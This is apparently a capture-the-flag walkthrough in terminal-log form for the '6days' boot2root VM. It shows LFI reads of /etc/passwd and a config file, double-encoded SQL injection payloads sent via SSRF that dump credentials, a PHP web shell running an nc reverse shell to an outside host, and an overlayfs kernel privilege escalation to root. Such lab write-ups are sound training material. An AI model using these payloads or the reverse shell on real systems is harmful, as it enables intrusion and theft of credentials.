root@Blue3:~# curl 6days.ctf
<html>
<head>
<title>Rashomon IPS - Main Page</title>
</head>
<body>
<h2>Rashomon Intrusion Prevention System</h2>
<h3>Become immune to every attack!</h3>
Today we're announcing our brand new product, Rashomon IPS! <br />
It's capable of blocking any <b>sophisticated cyber attack</b> which <u>can harm your precious customers.</u> (you don't want THAT to happen, do you?) <br />
<img src="http://172.16.35.129/image.php?src=https%3A%2f%2f4.bp.blogspot.com%2f-u8Jo4CEKQLk%2fV4OpiaoMJ7I%2fAAAAAAAAAiw%2f8kuCpTOpRWUAdp2p4GpegWdnOwxjwHNYQCLcB%2fs1600%2fphoto.jpg" /> <br />
(This guy is coming after your website!) <br />
<br />
Don't waste your time and money by hiring <font color="#ff00cc">pentesters</font> and doing real security audits. <br />
This is the best way to secure your organization and you can completely rely on it, and only it! <br />
<br />
IT'S SO SECURE WE EVEN USE IT ON OUR WEBSITE. <br />
<br />
So be quick and get a <u>%15 discount</u> on our newest product using the promocode <b>NONEEDFORPENTEST</b>. (discount will be available until yesterday)<br />
<br />
<form name="promo" method="GET" action="checkpromo.php">
Apply your promo code here: <input type="text" name="promocode">
<input type="submit" value="Apply Promo">
</form>
</body>
</html>

1, => Broken image:
<img src="http://172.16.35.129/image.php?src=https%3A%2f%2f4.bp.blogspot.com%2f-u8Jo4CEKQLk%2fV4OpiaoMJ7I%2fAAAAAAAAAiw%2f8kuCpTOpRWUAdp2p4GpegWdnOwxjwHNYQCLcB%2fs1600%2fphoto.jpg" /> <br />
=> Probably LFI/RFI

2, => checkpromo.php: maybe contains SQL query

#
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
#

Test LFI:

root@Blue3:~# curl 6days.ctf/image.php?src=/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
mysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/false
messagebus:x:103:106::/var/run/dbus:/bin/false
whoopsie:x:104:107::/nonexistent:/bin/false
landscape:x:105:110::/var/lib/landscape:/bin/false
sshd:x:106:65534::/var/run/sshd:/usr/sbin/nologin
user:x:1000:1000:user,,,:/home/user:/bin/bash
andrea:x:1001:1001::/home/andrea:/bin/andrea

=> OK
=> So this is LFI/RFI but reading img file type only => Can't execute code?

root@Blue3:~# curl 6days.ctf/image.php?src=./image.php
<?php
$img = $_GET['src'];
header('Content-Type: image/jpeg');
readfile($img);
?>

#
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
#

Let's check some config for credentials:

root@Blue3:~# curl 6days.ctf/image.php?src=./config.php
<?php
$servername = "localhost";
$username = "sellingstuff";
$password = "n0_\$\$_n0_g41ns";
$dbname = "fancydb";

=> DB Credentials. Now we need a shell.
All other files is access-blocked.
"root@Blue3:~# curl 6days.ctf/image.php?src=./update.html
Malicious request blocked!
~Rashomon IPS"
=> IPS :)

#
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
#

EXCEPT for a file I haven't checked: checkpromo.php:
root@Blue3:~# curl 6days.ctf/image.php?src=./checkpromo.php
<?php
include 'config.php';

$conn = mysql_connect($servername, $username, $password);

if (!$conn) {
	die("Connection failed: " . $conn->connect_error);
}

$sql = "SELECT discount, status FROM promocodes WHERE promocode='".$_GET['promocode']."';";

mysql_select_db($dbname);
$result = mysql_query($sql, $conn);

if (!$result) {
	echo "Promocode not valid!";
} else {
	while($row = mysql_fetch_array($result, MYSQL_ASSOC))
	{
		if($row['status'] == 0)
			echo "Code expired!";
		else
			echo "You have %".$row['discount']." discount!";
	}
}

mysql_close($conn);
?>

#
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
#

recon: "8080/tcp filtered http-proxy"
root@Blue3:~# curl 6days.ctf/image.php?src=/etc/apache2/sites-available/default
<VirtualHost *:8080>
	ServerAdmin webmaster@localhost

	DocumentRoot /var/www
	<Directory />
		Options FollowSymLinks
		AllowOverride None
	</Directory>
	<Directory /var/www/>
		Options Indexes FollowSymLinks MultiViews
		AllowOverride None
		Order allow,deny
		allow from all
	</Directory>

	ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
	<Directory "/usr/lib/cgi-bin">
		AllowOverride None
		Options +ExecCGI -MultiViews +SymLinksIfOwnerMatch
		Order allow,deny
		Allow from all
	</Directory>

	ErrorLog ${APACHE_LOG_DIR}/error.log

	# Possible values include: debug, info, notice, warn, error, crit,
	# alert, emerg.
	LogLevel warn

	CustomLog ${APACHE_LOG_DIR}/access.log combined

    Alias /doc/ "/usr/share/doc/"
    <Directory "/usr/share/doc/">
        Options Indexes MultiViews FollowSymLinks
        AllowOverride None
        Order deny,allow
        Deny from all
        Allow from 127.0.0.0/255.0.0.0 ::1/128
    </Directory>

</VirtualHost>

With the local file disclosure vulnerability we can take advantage for access port 8080 from the target.
Then, if we look at the checkpromo.php this code has vulnerabilities (SQL injection).
But because the IPs block all malicious code from external this SQL injection vulnerability cannot be exploited.

#
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
#

SQLinjection:
promocode: NONEEDFORPENTEST
query: "SELECT discount, status FROM promocodes WHERE promocode='".$_GET['promocode']."';"
Payload:
promodcode = NONEEDFORPENTEST' union all select schema_name,null from information_schema.schemata#
=> NONEEDFORPENTEST%2527%2bunion%2ball%2bselect%2bschema_name,null%2bfrom%2binformation_schema.schemata%25#

Test:
root@Blue3:~# curl 6days.ctf/image.php?promocode=NONEEDFORPENTEST
root@Blue3:~# curl 6days.ctf/checkpromo.php?promocode=NONEEDFORPENTEST
Code expired!
root@Blue3:~# curl 6days.ctf/image.php?src=http://127.0.0.1:8080/checkpromo.php
root@Blue3:~# curl 6days.ctf/image.php?src=http://127.0.0.1:8080/checkpromo.php?promocode=NONEEDFORPENTEST
Code expired!
=>
root@Blue3:~# echo;curl 6days.ctf/image.php?src=http://127.0.0.1:8080/checkpromo.php?promocode=NONEEDFORPENTEST%2527%2bunion%2ball%2bselect%2bschema_name,null%2bfrom%2binformation_schema.schemata%2523
Code expired!Code expired!Code expired!

#
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
#

On the checkpromo.php source code has stated if row “status” = 0 targets will be answered “Code expired!” then we can send a payload that is slightly different from the previous. Change “null” with number let’s say 1 or 2 or 3.

Payload: NONEEDFORPENTEST' union all select schema_name,1 from information_schema.schemata#
root@Blue3:~# curl 6days.ctf/image.php?src=http://127.0.0.1:8080/checkpromo.php?promocode=NONEEDFORPENTEST%2527%2bunion%2ball%2bselect%2bschema_name,1%2bfrom%2binformation_schema.schemata%2523
Code expired!You have %information_schema discount!You have %fancydb discount!

=> OK
=> Payload: ' union all select concat(username,':',password'),1 from fancydb.users#
<=> Double encoding: %2527%2520union%2ball%2bselect%2bconcat%2528username%252c%2527%254a%2527%252cpassword%2529%252c1%2bfrom%2bfancydb.users%2523

=>
root@Blue3:~# curl 6days.ctf/image.php?src=http://127.0.0.1:8080/checkpromo.php?promocode=%2527%2520union%2ball%2bselect%2bconcat%2528username%252c%2527%254a%2527%252cpassword%2529%252c1%2bfrom%2bfancydb.users%2523
You have %andreaJSayNoToPentests discount!

=> Account: andrea SayNoToPentests
according to recon: andrea:x:1001:1001::/home/andrea:/bin/andrea

#
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
#

=> test SSH:
root@Blue3:~# ssh andrea@6days.ctf
The authenticity of host '6days.ctf (172.16.35.129)' can't be established.
ECDSA key fingerprint is SHA256:3keyS4hymFgGKCTjQOYToo7bWvFUvSgasZ+YUE9qNaA.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '6days.ctf,172.16.35.129' (ECDSA) to the list of known hosts.
andrea@6days.ctf's password: SayNoToPentests
Welcome to Ubuntu 12.04.5 LTS (GNU/Linux 3.13.0-32-generic i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Mon Aug 24 19:29:13 EEST 2020

  System load:  0.0               Processes:           109
  Usage of /:   19.7% of 6.76GB   Users logged in:     0
  Memory usage: 14%               IP address for eth0: 172.16.35.129
  Swap usage:   0%

  Graph this data and manage this system at:
    https://landscape.canonical.com/

New release '14.04.4 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


Your Hardware Enablement Stack (HWE) is supported until April 2017.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

andrea@cypm:~$

=> We got the shell
andrea@cypm:~$ uname -a
andrea@cypm:~$ cat /etc/os-release
andrea@cypm:~$ ?
rbash: /usr/bin/python: restricted: cannot specify `/' in command names

But it is restricted shell ...

#
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
#

I need another shell. How about www-data shell?

andrea@cypm:~$ echo "<?php system('nc -e /bin/bash 172.16.35.1 4444');?>" > /var/www/nc.php
rbash: /var/www/nc.php: restricted: cannot redirect output

andrea@cypm:~$ echo "<?php system('nc -e /bin/bash 172.16.35.1 4444');?>" | tee /var/www/nc.php
=> 6days.ctf/nc.php

root@Blue3:~# nc -lvnp 4444
listening on [any] 4444 ...
connect to [172.16.35.1] from (UNKNOWN) [172.16.35.129] 57979
whoami
www-data

=> BOOYAH!

#
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
#

python -c 'import pty; pty.spawn("/bin/bash")'
www-data@cypm:/var/www$ uname -a
uname -a
Linux cypm 3.13.0-32-generic #57~precise1-Ubuntu SMP Tue Jul 15 03:50:54 UTC 2014 i686 i686 i386 GNU/Linux

root@Blue3:~# searchsploit 3.13.0
-------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                      |  Path
-------------------------------------------------------------------------------------------------------------------- ---------------------------------
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation                | linux/local/37292.c
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation (Access /etc/s | linux/local/37293.txt
-------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

=> OK easy exploit.

www-data@cypm:/$ cd /tmp
cd /tmp
www-data@cypm:/tmp$ ls -ltra
ls -ltra
total 16
drwxr-xr-x 22 root     root     4096 Jul 24  2016 ..
drwxrwxrwt  2 root     root     4096 Aug 24 19:50 .
-rw-r--r--  1 www-data www-data 5119 Aug 24 19:56 exploit.c

www-data@cypm:/tmp$ gcc exploit.c -o exploit.c
gcc exploit.c -o exploit.c
www-data@cypm:/tmp$ ls -ltra
ls -ltra
total 20
drwxr-xr-x 22 root     root      4096 Jul 24  2016 ..
-rwxr-xr-x  1 www-data www-data 12018 Aug 24 19:58 exploit.c
drwxrwxrwt  2 root     root      4096 Aug 24 19:58 .
www-data@cypm:/tmp$ ./exploit.c
./exploit.c
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# whoami
whoami
root

=> Done.

# /flag


  _________ _____  __  ______  __  ______ _      ______    ____ ___  ___
 / ___/ __ `/ __ \/ / / / __ \/ / / / __ \ | /| / / __ \  / __ `__ \/ _ \
/ /__/ /_/ / / / / /_/ / /_/ / /_/ / /_/ / |/ |/ / / / / / / / / / /  __/
\___/\__,_/_/ /_/\__, /\____/\__,_/ .___/|__/|__/_/ /_(_)_/ /_/ /_/\___/
                /____/           /_/


        Author: @1ce7ea


	Congratulations on successfully completing our boot2root vm!
	Please consider visiting our website and following us on Twitter.
	And please provide feedback. I hope you enjoyed it :)

	Website: http://canyoupwn.me/
	Twitter: https://twitter.com/canyoupwnme
	Author: https://twitter.com/1ce7ea
